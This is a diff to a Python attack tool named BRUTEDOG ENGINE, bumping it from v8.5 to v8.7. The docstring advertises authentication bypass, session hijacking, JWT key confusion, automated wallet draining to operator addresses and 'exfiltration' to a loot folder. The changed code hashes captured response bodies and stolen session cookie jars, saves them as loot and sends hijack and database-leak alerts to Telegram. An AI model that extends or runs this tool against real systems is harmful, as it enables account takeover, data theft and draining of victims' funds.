@@ -1,20 +1,20 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v8.5 — State-Machine Logic & Cognitive Supreme Exploitation Engine (WAF Hardened)
+BRUTEDOG ENGINE v8.7 — State-Machine Logic & Cognitive Supreme Exploitation Engine (Elite Red Team Adversarial Edition)
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
 - Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
 - Crawler-driven conditional module gating (Zero blind execution; modules fire strictly based on discovered surface area)
-- Automated BOLA and state-skipping vector evaluation across security tiers
-- Live autonomous test-account session propagation across exploit modules
+- Automated BOLA and state-skipping vector evaluation across security tiers with SHA-256 integrity mapping
+- Live autonomous test-account session propagation across exploit modules with immutable disk logging (loot_output/)
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
 - Advanced Protocol & Cryptographic Assault Suite (GraphQL, WebSockets, DNS Rebinding, JWT Key Confusion)
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
-- Integrated with asynchronous Telegram telemetry broadcasting
+- Integrated with asynchronous Telegram telemetry broadcasting & real-time proof-of-work streaming
 """
 import asyncio
 import json
@@ -22,6 +22,7 @@ import re
 import socket
 import sys
 import time
+import hashlib
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
@@ -251,6 +252,9 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         except:
             extracted_proof = {"raw_response_snippet": body[:200]}
 
+        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
+        extracted_proof["integrity_hash"] = loot_hash
+
         stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})
 
         save_session_loot(
@@ -276,6 +280,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
         sys.stdout.flush()
         
+        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
         save_session_loot(
             target=target_url or "unknown_target",
             endpoint=endpoint,
@@ -283,10 +288,10 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             status=status,
             headers=headers,
             body=body,
-            extra_loot={"database_error": db_error}
+            extra_loot={"database_error": db_error, "integrity_hash": loot_hash}
         )
 
-        dispatch_tg_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status})
+        dispatch_tg_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
 
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
@@ -328,7 +333,8 @@ def verify_hijacked_session(transport):
                 verified = True
 
         if verified:
-            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": status})
+            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
+            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": dict(transport.cookie_jar), "hash": loot_hash}, body, {"verified_status": status})
             success(f"[+] Session successfully verified against backend route: {endpoint}")
             
             save_session_loot(
@@ -338,10 +344,10 @@ def verify_hijacked_session(transport):
                 status=status,
                 headers=headers,
                 body=body,
-                extra_loot={"cookie_jar": dict(transport.cookie_jar)}
+                extra_loot={"cookie_jar": dict(transport.cookie_jar), "integrity_hash": loot_hash}
             )
 
-            dispatch_tg_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status})
+            dispatch_tg_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
             return True
         else:
             sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
@@ -418,7 +424,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.5 (WAF HARDENED)")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.7 (WAF HARDENED)")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -608,9 +614,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         error(f"Race condition module failed: {exc}")
 
     # ==========================================================
-    # NEW MODULE BINDINGS: PROTOCOL & CRYPTO ASSAULT PHASE
+    # ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.7)
     # ==========================================================
-    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE")
+    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.7)")
     sys.stdout.write(f"\033[96m[ENGINE] Launching GraphQL, WebSocket, DNS Rebinding & JWT Confusion suite...\033[0m\n")
     sys.stdout.flush()
 
